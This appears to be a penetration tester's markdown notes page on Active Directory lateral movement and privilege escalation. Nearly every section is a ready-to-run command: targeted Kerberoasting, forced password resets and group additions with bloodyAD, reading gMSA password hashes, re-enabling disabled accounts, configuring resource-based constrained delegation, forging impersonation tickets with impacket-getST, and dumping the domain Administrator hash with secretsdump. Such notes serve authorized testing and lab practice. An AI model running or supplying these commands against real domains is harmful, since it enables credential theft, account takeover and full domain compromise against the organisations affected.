```sh
sudo apt install bloodyad
```

## GenericWrite

If ADCS is installed, try [shadow credentials]({{< relref "8. Lateral Movement/ADCS attacks#shadow-credentials" >}}) first
## Kerberoast

> NOTE: Use when you have `GenericWrite` or `WriteSPN` on a **user**
### Manual

TODO: add this

### Automated

Install tool

```sh
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast
python -m venv .venv
pip install -r ./requirement.txt
```

Do the thing

```sh
python3 ./targetedKerberoast.py -d domain.name -u 'user' -p 'pass' -request-user victim
```

## Change password

> NOTE: Use when you have `GenericWrite` or `ForceChangePassword` on a **user**

Might deny service, outage, got found out, etc. Use with caution.

```sh
bloodyAD -d $domain --host $target -u 'user' -p 'pass' set password 'victim' 'password'
```

## Add user to a group

> NOTE: Use when you have `AddSelf` or `AddMember` on a **group**

```sh
bloodyAD -d $domain --host $target -u 'user' -p 'pass' add groupMember 'group' 'user'
```

I hate windows

```cmd
net group "<group>” <user> /add /domain
```

## ReadGMSApassword

You can get NTLM hash of victim

```sh
bloodyAD --host 'dc01.domain.name' -d 'domain.name' -u 'user' -p 'password' get object 'victim' --attr msDS-ManagedPassword
```

## Enable account

> NOTE: See [8. Lateral Movement/AD Enumeration/Get All Properties#Writable Objects]({{< relref "8. Lateral Movement/AD Enumeration/Get All Properties#writable-objects" >}}). If we can write to `UserAccountControl` then we can enable the account

```sh
bloodyAD --host 'dc01.domain.name' -d 'domain.name' -u 'user' -p 'password' remove uac 'victim' -f ACCOUNTDISABLE
```

Sometimes, `LogonHours` is also set to `\x00`. If this is set, you cannot log into the account. If you can write to the `logonHours` attribute of the object, write full `\xFF` to it

```sh
bloodyAD --host 'dc01.domain.name' -d 'domain.name' -u 'user' -p 'password' set object 'victim' logonHours '////////////////////////////' --b64
```

## Resource-based Constraint Delegation (RBCD)

> When a **computer** has `AllowedToAct` on DC, it means that the DC is going to trust the kerberos ticket that this **computer account** create.
> So we can impersonate a user that can do `DCSync`, and also trusted for constrained delegation (???)
> NOTE: Use when you have `AllowedToAct` or `AddAllowToAct` on the **Domain Controller**, and you need to own a **computer** account, NTLM hash or password, whichever works. You can also create one yourself if possible.

### AddAllowToAct

Set `AllowToAct` on a computer account to be able to act as `DC01` computer.

- `Powershell` method. This is when you have a shell as the user but no password

```powershell
Set-ADComputer dc01 -PrincipalsAllowedToDelegateToAccount 'delegated-computer$'
```

- `BloodyAD` method. This is when you have the user's password

```sh
bloodyAD --host dc01.domain.name -d domain.name -u user -p password add rbcd 'DC01$' ''
```

Confirm if the previous works

```powershell
Get-ADComputer dc01 -Properties PrincipalsAllowedToDelegateToAccount
```
### RBCD

Find whether an account is available for delegation. If it returns `false`, it is ok. Generally, target accounts in `Administrators`, `Enterprise Admin` groups.

- `Powershell` method

```powershell
Get-ADUser Administrator -Properties AccountNotDelegated
```
- `BloodyAD` method

```sh
bloodyAD --host dc01.domain.name -d domain.name -u user -p password get object 'Administrator' --attr AccountNotDelegated
```

First we request a ticket, impersonate someone can be delegated. Idk how this thing works, absolute black magic

```sh
impacket-getST -spn 'cifs/dc01.domain.name' -impersonate dc01$ 'domain.name/delegated-computer$' -hashes ':asdasdadasdasdasdaasdasdasdas'
```

Then we use the ticket to authenticate and use `secretsdump`

```sh
KRB5CCNAME=dc01\$@http_dc01.domain.name@domain.name.ccache impacket-secretsdump -no-pass -k dc01.domain.name -just-dc-ntlm -just-dc-user administrator
```
